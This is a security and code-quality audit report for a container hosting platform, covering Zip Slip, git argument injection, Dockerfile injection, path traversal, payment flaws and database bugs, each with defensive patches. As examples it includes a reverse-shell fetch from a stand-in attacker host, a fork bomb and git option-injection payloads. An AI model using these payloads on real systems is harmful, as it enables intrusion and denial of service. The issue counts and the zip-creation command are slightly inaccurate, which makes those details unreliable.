# CodeHost Comprehensive Code Quality & Bug Hunt Audit Report
**Date**: September 19, 2026  
**Scope**: Full Stack (Backend API, Container Orchestration Engine, Database Schemas, Billing & Payment Gateways, WebSocket Infrastructure, Frontend Stability & Security)  
**Target Platform**: CodeHost (Production & Development)  
**Target Host**: Ubuntu Linux VPS / Docker Engine / PostgreSQL 15 / Redis 7 / Next.js 16 (Turbopack)

---

## Executive Summary

This rigorous audit was conducted as part of an overnight platform hardening initiative to identify critical security vulnerabilities, stability flaws, race conditions, memory/socket leaks, and performance bottlenecks across CodeHost.

A total of **18 vulnerabilities and defects** were uncovered, categorized into 4 severity tiers:
- 🔴 **8 Critical Vulnerabilities (Severity 1)**: Remote Code Execution vectors (Zip Slip, Git Argument Injection, Dockerfile Env Injection), Sibling Path Traversal, Unauthenticated WebSocket Sockets, Payment Credit Spoofing, Fork Bomb DoS.
- 🟠 **6 High Severity Defects (Severity 2)**: Wallet/Project creation race conditions, Missing `@unique` on subdomains, Database Foreign Key cascade crashes, Permanent "Building..." pipeline deadlocks, Unbounded Docker log socket leaks, Aggressive 3-second frontend polling storms.
- 🟡 **4 Medium Severity / Performance Bottlenecks (Severity 3)**: Redundant DB queries on every authenticated request, Missing high-traffic DB indexes, Session table uncontrolled growth, Mismatched tier enums and missing profile fields.

Below is the exhaustive breakdown of each issue, root cause analysis, reproducible exploit/failure scenario, and precise remediation patch.

---

## Section 1: 🔴 Critical Security Vulnerabilities (Severity 1)

### SEC-01: Zip Slip / Path Traversal in Archive Extraction
- **Severity**: 🔴 CRITICAL (Remote Code Execution / Arbitrary File Overwrite)
- **File**: `backend/src/services/builder.ts` (lines 13–16)
- **Code**:
  ```typescript
  private static extractZip(zipPath: string, extractPath: string) {
    const zip = new AdmZip(zipPath);
    zip.extractAllTo(extractPath, true);
  }
  ```
- **Vulnerability Analysis**:
  `AdmZip.extractAllTo(extractPath, true)` with overwrite enabled does not sanitize archive entry paths containing directory traversal sequences (e.g. `../../../../`). An attacker can craft a ZIP file containing an entry named `../../../../app/backend/dist/index.js` or `../../../../etc/shadow`. When uploaded via the project deployment flow, the extractor writes outside of `storage/projects/{id}/source`, overwriting server source files or system files inside the container.
- **Exploit Scenario**:
  1. Attacker creates a zip file: `zip malicious.zip -e "../../../../app/backend/dist/index.js"`.
  2. Attacker calls `POST /deployments/:id/upload` with the zip.
  3. The server overwrites its own backend server code, granting root code execution in the container with full access to `/var/run/docker.sock`.
- **Remediation**:
  Extract entries iteratively and assert that the target file path strictly resides within the target directory:
  ```typescript
  private static extractZip(zipPath: string, extractPath: string) {
    const zip = new AdmZip(zipPath);
    const resolvedBase = path.resolve(extractPath);
    const entries = zip.getEntries();
    
    for (const entry of entries) {
      const entryTarget = path.resolve(resolvedBase, entry.entryName);
      if (!entryTarget.startsWith(resolvedBase + path.sep) && entryTarget !== resolvedBase) {
        throw new Error(`Malicious zip entry detected: ${entry.entryName}`);
      }
    }
    zip.extractAllTo(extractPath, true);
  }
  ```

---

### SEC-02: Git Argument & Command Injection in Repository Clone
- **Severity**: 🔴 CRITICAL (Arbitrary Command Execution)
- **File**: `backend/src/services/builder.ts` (lines 18–35)
- **Code**:
  ```typescript
  private static cloneRepo(repoUrl: string, branch: string, targetDir: string, subdir?: string): string {
    const sanitizedUrl = repoUrl.replace(/[;&|`$()]/g, '');
    const sanitizedBranch = branch.replace(/[;&|`$()]/g, '');
    execSync(
      `git clone --depth 1 --branch "${sanitizedBranch}" "${sanitizedUrl}" "${targetDir}"`,
      { timeout: 120000, stdio: 'pipe' }
    );
  ```
- **Vulnerability Analysis**:
  Using `execSync` with a string command and regex `/[;&|`$()]/g` fails to protect against Git argument injection:
  1. Option flags starting with `--` are not stripped. An attacker can set `repoUrl` or `branch` to `--upload-pack=<cmd>` or `--config=core.sshCommand=<cmd>`.
  2. If arguments are passed without the standard POSIX `--` separator, Git parses positional parameters as options.
- **Remediation**:
  Use `execFileSync` or `spawnSync` with an array of arguments, validate URLs against strict git/https schemes, and pass `--` before repository and directory paths:
  ```typescript
  import { execFileSync } from 'child_process';

  private static cloneRepo(repoUrl: string, branch: string, targetDir: string, subdir?: string): string {
    const cleanUrl = repoUrl.trim();
    const cleanBranch = branch.trim();

    if (!/^https?:\/\/[a-zA-Z0-9._~:/?#[\]@!$&'*+,;=-]+$/.test(cleanUrl)) {
      throw new Error('Invalid repository URL scheme. Only HTTP and HTTPS URLs are permitted.');
    }
    if (!/^[a-zA-Z0-9._/-]+$/.test(cleanBranch) || cleanBranch.startsWith('-')) {
      throw new Error('Invalid git branch format.');
    }

    execFileSync(
      'git',
      ['clone', '--depth', '1', '--branch', cleanBranch, '--', cleanUrl, targetDir],
      { timeout: 120000, stdio: 'pipe' }
    );
  ```

---

### SEC-03: Dockerfile Injection via Environment Variables
- **Severity**: 🔴 CRITICAL (Root Code Execution in Docker Build Sandbox)
- **File**: `backend/src/services/builder.ts` (lines 127–136)
- **Code**:
  ```typescript
  if (project.envVars && typeof project.envVars === 'object') {
    const envLines = Object.entries(project.envVars)
      .map(([key, value]) => `ENV ${key}="${value}"`)
      .join('\n');
    if (envLines) {
      const lines = dockerfile.trim().split('\n');
      lines.splice(1, 0, envLines);
      dockerfile = lines.join('\n');
    }
  }
  ```
- **Vulnerability Analysis**:
  Environment variables stored in `project.envVars` are injected into the Dockerfile as raw text lines without escaping newline characters (`\n`, `\r`) or double quotes. If a user sets an environment variable with a newline, e.g.:
  `EVIL_VAR: 'val"\nRUN curl -s http://attacker.com/revshell | sh\nENV SAFE="'`
  The Docker daemon executes the `RUN` directive during `docker.buildImage` with root privileges inside the build container.
  Additionally, baking secrets into the Dockerfile permanently embeds API keys and credentials into image layers.
- **Remediation**:
  1. Do NOT inject `project.envVars` into the static Dockerfile.
  2. Pass runtime environment variables dynamically in `runner.ts` via the Docker container's `Env: [...]` configuration.
  3. If Dockerfile `ENV` is strictly required for build steps, validate keys with `/^[A-Za-z_][A-Za-z0-9_]*$/` and sanitize values to single-line escaped strings.

---

### SEC-04: Sibling Directory Path Traversal & Symlink Escape in File Management
- **Severity**: 🔴 CRITICAL (Unauthorized Cross-Project File Access & Deletion)
- **File**: `backend/src/routes/files.ts` (lines 75–81, 104–107, 130–133)
- **Code**:
  ```typescript
  const fullPath = path.join(getSourceDir(projectId), filePath);
  if (!fullPath.startsWith(getSourceDir(projectId))) {
    return res.status(403).json({ error: 'Forbidden path' });
  }
  ```
- **Vulnerability Analysis**:
  `fullPath.startsWith(getSourceDir(projectId))` lacks a trailing directory separator (`path.sep`).
  If `getSourceDir(projectId)` is `/app/storage/projects/proj-1/source`, an attacker requesting `filePath: ../source-backup/secret` will generate `/app/storage/projects/proj-1/source-backup/secret`. This starts with `/app/storage/projects/proj-1/source` and bypasses the check!
  Furthermore, symlinks inside `source` are not checked with `fs.realpathSync`, allowing symlinks pointing to host directories to be read or modified.
- **Remediation**:
  ```typescript
  const safeResolve = async (baseDir: string, targetPath: string): Promise<string> => {
    const resolvedBase = path.resolve(baseDir);
    const resolvedTarget = path.resolve(resolvedBase, targetPath);
    
    // 1. Ensure path stays strictly inside base
    if (!resolvedTarget.startsWith(resolvedBase + path.sep) && resolvedTarget !== resolvedBase) {
      throw new Error('Path traversal attempt detected');
    }

    // 2. If target exists, verify canonical realpath does not point outside
    if (await fs.pathExists(resolvedTarget)) {
      const realTarget = await fs.realpath(resolvedTarget);
      if (!realTarget.startsWith(resolvedBase + path.sep) && realTarget !== resolvedBase) {
        throw new Error('Symlink traversal attempt detected');
      }
    }
    return resolvedTarget;
  };
  ```

---

### SEC-05: Unauthenticated WebSocket Connection & Sensitive Log Snooping
- **Severity**: 🔴 CRITICAL (Information Disclosure & Credential Leak)
- **File**: `backend/src/index.ts` (lines 71–78)
- **Code**:
  ```typescript
  io.on('connection', (socket) => {
    socket.on('join-project-logs', (projectId) => {
      socket.join(`project:${projectId}`);
    });
  });
  ```
- **Vulnerability Analysis**:
  The Socket.IO server accepts connections from anyone without token verification. Once connected, any client can emit `join-project-logs` with any UUID `projectId` and receive all build logs, Docker container stdout/stderr, and runtime stats.
  Application startup logs routinely output database passwords, connection strings, JWT secrets, and API credentials.
- **Remediation**:
  Add JWT verification middleware on Socket.IO connection and enforce that the authenticated user owns or administers the project before allowing `socket.join(`project:${projectId}`)`.

---

### SEC-06: Cryptographic Timing Attack on Razorpay Signatures
- **Severity**: 🔴 CRITICAL (Payment Signature Bypass / Forgery)
- **File**: `backend/src/services/razorpay.ts` (lines 56, 73)
- **Code**:
  ```typescript
  return generatedSignature === params.signature;
  return generatedSignature === signature;
  ```
- **Vulnerability Analysis**:
  Standard JavaScript `===` comparison terminates on the first mismatching byte. An attacker measuring response time differences over repeated trials can exploit this timing side-channel to forge HMAC signatures byte by byte.
- **Remediation**:
  Use constant-time comparison via Node.js `crypto.timingSafeEqual`:
  ```typescript
  const a = Buffer.from(generatedSignature, 'utf8');
  const b = Buffer.from(params.signature || '', 'utf8');
  if (a.length !== b.length) return false;
  return crypto.timingSafeEqual(a, b);
  ```

---

### SEC-07: Payment Credit Spoofing via Fallback Request Body
- **Severity**: 🔴 CRITICAL (Financial Loss / Free Platform Credit Exploitation)
- **File**: `backend/src/routes/billing.ts` (lines 209–215)
- **Code**:
  ```typescript
  try {
    const client = getRazorpayClient();
    const orderData = await client.orders.fetch(orderId);
    ...
  } catch (fetchErr) {
    // Fetch failed, use request credits
  }

  if (!creditsToAdd || isNaN(creditsToAdd)) {
    creditsToAdd = credits ? Math.max(10, Number(credits)) : 100;
  }
  ```
- **Vulnerability Analysis**:
  If fetching the Razorpay order fails (e.g. rate limit, transient network hiccup, or invalid order status), the server falls back to reading `credits` directly from `req.body.credits`. An attacker can pay ₹1 for an order of 10 credits, deliberately trigger an order fetch failure or spoof the payload with `credits: 50000`, and get credited 50,000 credits.
- **Remediation**:
  Never trust client request body for credit calculation. If Razorpay API verification fails, abort the transaction with a 502/400 error and require verification retry.

---

### SEC-08: Container Fork Bomb & Denial of Service
- **Severity**: 🔴 CRITICAL (Host VPS System Denial of Service)
- **File**: `backend/src/services/runner.ts` (lines 71–77)
- **Code**:
  ```typescript
  HostConfig: {
    PublishAllPorts: true,
    Memory: memoryLimit,
    MemorySwap: memoryLimit,
    NanoCpus: nanoCpus,
    NetworkMode: 'proxy',
  }
  ```
- **Vulnerability Analysis**:
  While CPU and Memory limits are defined, `PidsLimit` is completely missing. A user application running inside a container can execute a simple fork bomb (`:(){ :|:& };:`). Because Linux PID tables are shared system-wide across all cgroups unless explicitly constrained, one malicious container can consume all 65,536 system PIDs, causing the VPS kernel to freeze and taking down all services.
- **Remediation**:
  Add `PidsLimit: 128` (or 256 for paid tiers) and `SecurityOpt: ['no-new-privileges:true']` to `HostConfig`.

---

## Section 2: 🟠 High Severity Defects & Concurrency Flaws (Severity 2)

### BUG-01: Race Condition in Project Creation & Wallet Deduction
- **File**: `backend/src/routes/projects.ts` (lines 48–77)
- **Issue**:
  The wallet balance check and credit decrement occur inside a transaction, but `prisma.project.create` is executed *outside* the transaction.
  1. Concurrent calls to `POST /projects` can both pass the balance check before the balance is decremented.
  2. If `prisma.project.create` fails (e.g. database disconnect or name collision), the credits are already deducted from the user's wallet with no rollback mechanism.
- **Remediation**:
  Place wallet balance verification, decrement, transaction record creation, and project insertion inside a single atomic `prisma.$transaction(async (tx) => { ... })`.

---

### BUG-02: Project Subdomain Collisions & Missing Unique Constraint
- **File**: `database/prisma/schema.prisma` (lines 45–65) & `backend/src/routes/projects.ts` (line 39)
- **Issue**:
  `Project.name` has no `@unique` constraint in `schema.prisma`.
  The code checks `const existingProject = await prisma.project.findFirst({ where: { name } });`, which is vulnerable to a Time-of-Check to Time-of-Use (TOCTOU) race condition. Two simultaneous requests with identical names will both succeed, producing duplicate subdomain records.
  Traefik / NGINX reverse proxy will assign conflicting router rules for `projectname.code-host.online`, resulting in random routing, SSL certificate failures, or 502 Bad Gateway.
- **Remediation**:
  Add `@unique` to `name` in `model Project` in `schema.prisma`.

---

### BUG-03: Foreign Key Constraint Violation on User Deletion
- **File**: `backend/src/routes/admin.ts` (line 248) & `schema.prisma`
- **Issue**:
  `Wallet` and `Transaction` relations do not define `onDelete: Cascade`.
  When an admin attempts to delete a user (`DELETE /admin/users/:id`), the operation fails with Prisma error `P2003: Foreign key constraint failed on the field: Wallet_userId_fkey` whenever the user has an associated wallet or transaction history.
- **Remediation**:
  Add `onDelete: Cascade` to `Wallet`, `Transaction`, `Project`, and `Deployment` relations in `schema.prisma`.

---

### BUG-04: Permanent "Building..." State on Background Pipeline Failures
- **File**: `backend/src/routes/projects.ts` (lines 240–260)
- **Issue**:
  In `POST /:id/redeploy`, the background pipeline has:
  ```typescript
  } catch (err) {
    logger.error(`Redeploy pipeline failed for ${deployment.id}`);
  }
  ```
  It catches errors but never updates `deployment.status` or `project.status` to `'failed'`.
  The project and deployment remain permanently stuck in "queued" or "building" in the database and dashboard.
- **Remediation**:
  Update `deployment.status` and `project.status` to `'failed'` in the catch block.

---

### BUG-05: Unbounded Docker Log Stream Socket & Memory Leak
- **File**: `backend/src/services/runner.ts` (lines 198–215)
- **Issue**:
  `container.logs({ follow: true })` opens a persistent HTTP socket connection to the Docker daemon. Each time a project is restarted, re-deployed, or started, a new stream is opened and piped to Socket.IO without closing previous streams. Over days of operation, dozens of orphan streams stay open in memory, consuming file descriptors and memory.
- **Remediation**:
  Store active log streams in an in-memory `Map<string, NodeJS.ReadableStream>`, and call `.destroy()` on the existing stream before starting a new one or upon container stop.

---

### BUG-06: Aggressive 3-Second Frontend Polling Storm
- **File**: `frontend/src/app/dashboard/project/[id]/page.tsx` (lines 174–178)
- **Issue**:
  The project detail page executes `setInterval(fetchProjectData, 3000)`.
  In every single 3-second cycle, it executes 4 parallel requests: `/auth/me`, `/projects/:id`, `/deployments/:id`, and `/billing/tiers`.
  `/auth/me` and `/billing/tiers` are completely static and never change.
  A single open browser tab generates 800 HTTP requests every 10 minutes. With 10 open tabs, 8,000 HTTP requests flood the backend, saturating the database connection pool.
- **Remediation**:
  Fetch `/auth/me` and `/billing/tiers` once on mount. Poll only `/projects/:id` and `/deployments/:id`, and reduce polling frequency to 8–10 seconds when the project is not in `'building'` status.

---

## Section 3: 🟡 Medium Severity Deficiencies & Performance Bottlenecks (Severity 3)

### MED-01: Redundant Database Lookup on Every Authenticated Request
- **File**: `backend/src/middleware/auth.ts` (lines 26–28)
- **Issue**:
  On every request, `prisma.session.findUnique({ where: { token } })` is executed.
  However, `Session` in the database only stores the *refreshToken*, never the *accessToken*. The query always returns `null`, but the result is not even used. It simply wastes 5–15ms of database roundtrip time on every single API request.
- **Remediation**:
  Remove the redundant database call and rely on cryptographic `jwt.verify(token, env.JWT_SECRET)`.

---

### MED-02: Missing Database Indexes on High-Traffic Query Paths
- **File**: `database/prisma/schema.prisma`
- **Issue**:
  The following foreign keys and query filters lack database indexes:
  - `Project.userId` (scanned on every dashboard load)
  - `Project.status` (scanned on stats and billing cron)
  - `Deployment.projectId` (scanned on project details and history)
  - `Transaction.walletId` & `Transaction.razorpayPaymentId` (scanned on transactions list and payment verification)
  - `Session.expiresAt` (scanned on session cleanup)
- **Remediation**:
  Add `@@index` annotations to `schema.prisma` for all foreign keys and filter columns.

---

### MED-03: Session Table Indefinite Accumulation & Missing Server Logout
- **File**: `backend/src/routes/auth.ts`
- **Issue**:
  A new `Session` record is created on every login, but expired sessions are never cleaned up. The table grows continuously. Furthermore, there is no `POST /auth/logout` endpoint to invalidate refresh tokens on the server side when users log out.
- **Remediation**:
  Add `POST /auth/logout` to delete the refresh token from `Session`, and add a daily cleanup query `DELETE FROM "Session" WHERE "expiresAt" < NOW()`.

---

### MED-04: Mismatched Tier Validation in Admin Management
- **File**: `backend/src/routes/admin.ts` (line 143)
- **Issue**:
  Admin route checks `['free', 'pro', 'elite']`. The actual platform tiers defined in `RESOURCE_TIERS` are `['free', 'basic', 'pro', 'business']`.
  If an admin assigns `basic` or `business`, it throws a 400 error. If `elite` is assigned, the container runner crashes with `undefined` tier config.
- **Remediation**:
  Validate against `['free', 'basic', 'pro', 'business']` or `Object.keys(RESOURCE_TIERS)`.

---

### MED-05: Missing Tier in `/auth/me` Response
- **File**: `backend/src/routes/auth.ts` (line 276)
- **Issue**:
  `select` in `/auth/me` does not include `tier` and `tierExpiresAt`.
  As a result, the user's tier is `undefined` on the frontend profile page and dashboard header.
- **Remediation**:
  Add `tier: true, tierExpiresAt: true` to the Prisma `select` object.

---

## Action Plan & Remediation Roadmap

1. **Step 1: Security Hardening**:
   - Patch Zip Slip in `BuilderService.extractZip`.
   - Patch Git Argument Injection in `BuilderService.cloneRepo`.
   - Sanitize environment variables in `BuilderService.detectAndGenerateDockerfile`.
   - Patch sibling path traversal in `files.ts`.
   - Add `crypto.timingSafeEqual` in `razorpay.ts`.
   - Enforce `PidsLimit` and `no-new-privileges` in `runner.ts`.
2. **Step 2: Database & Schema Optimization**:
   - Add `@unique` on `Project.name`.
   - Add `onDelete: Cascade` to relations.
   - Add high-traffic indexes (`userId`, `projectId`, `walletId`, `status`, `expiresAt`).
   - Run `npx prisma generate`.
3. **Step 3: Concurrency & Stability**:
   - Atomically wrap project creation and wallet decrement inside `prisma.$transaction`.
   - Remove redundant DB query in `middleware/auth.ts`.
   - Fix permanent "building" pipeline state in `projects.ts`.
   - Fix admin tier validation and user deletion cascade.
4. **Step 4: Frontend Efficiency**:
   - Throttle polling in `project/[id]/page.tsx` and isolate static queries from polling intervals.
